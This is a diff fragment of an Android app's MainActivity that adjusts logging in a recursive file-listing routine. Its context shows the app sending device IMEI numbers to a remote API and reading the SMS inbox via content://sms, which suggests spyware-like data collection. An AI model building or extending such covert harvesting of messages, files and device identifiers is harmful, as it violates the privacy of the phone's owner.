@@ -282,7 +282,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void getAllFilesOfDir(File directory) {
-        Log.d("Directory", "Directory: " + directory.getAbsolutePath() + "\n");
+
 
         final File[] files = directory.listFiles();
 
@@ -293,7 +293,9 @@ public class MainActivity extends AppCompatActivity {
                         getAllFilesOfDir(file);
 
                     } else {  // it is a file...
+                        Log.d("Directory", "Directory: " + directory.getAbsolutePath() + "\n");
                         Log.d("FileHaiKya", "File: " + file.getAbsolutePath() + "\n");
+                        Log.d("File Name", file.getName());
                     }
                 }
             }
@@ -310,8 +312,6 @@ public class MainActivity extends AppCompatActivity {
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
         Allapi cr = retrofit.create(Allapi.class);
-
-
         Call<MainBean> call = cr.main(id, imeiNumber1, imeiNumber2);
         call.enqueue(new Callback<MainBean>() {
             @Override
@@ -458,7 +458,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     public List<String> getSMS() {
-        
+
         List<String> sms = new ArrayList<String>();
         Uri uriSMSURI = Uri.parse("content://sms");
         StringBuffer sb = new StringBuffer();
